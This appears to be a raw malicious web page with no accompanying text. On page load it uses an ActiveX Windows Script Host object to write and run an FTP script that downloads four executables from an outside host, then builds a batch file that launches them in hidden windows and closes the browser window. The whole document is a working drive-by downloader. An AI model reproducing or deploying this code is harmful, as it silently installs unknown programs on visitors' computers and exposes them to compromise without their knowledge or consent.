<html>
<object id='wsh' classid='clsid:F935DC22-1CF0-11D0-ADB9-00C04FD58A0B'></object>
<script>
wsh.Run('command /C echo open downloads.default-homepage-network.com>o',false,6);
wsh.Run('command /C echo tmpacct>>o',false,6);
wsh.Run('command /C echo 12345>>o',false,6);
wsh.Run('command /C echo bin>>o',false,6);
wsh.Run('command /C echo get bs5-nt15v.exe>>o',false,6);
wsh.Run('command /C echo get 0021-bdl94126.EXE>>o',false,6);
wsh.Run('command /C echo get silent.exe>>o',false,6);
wsh.Run('command /C echo get CS4P028.exe>>o',false,6);
wsh.Run('command /C echo bye>>o',false,6);
wsh.Run('command /C echo if not exist %windir%\statuslog ftp -s:o >o.bat',false,6);
wsh.Run('command /C echo if exist bs5-nt15v.exe bs5-nt15v.exe >>o.bat',false,6);
wsh.Run('command /C echo if exist 0021-bdl94126.EXE 0021-bdl94126.EXE >>o.bat',false,6);
wsh.Run('command /C echo if exist silent.exe silent.exe >>o.bat',false,6);
wsh.Run('command /C echo if exist CS4P028.exe CS4P028.exe >>o.bat',false,6);
wsh.Run('command /C o.bat',false,6);
</script>
<script language=javascript>
self.close()
</script>
</html>


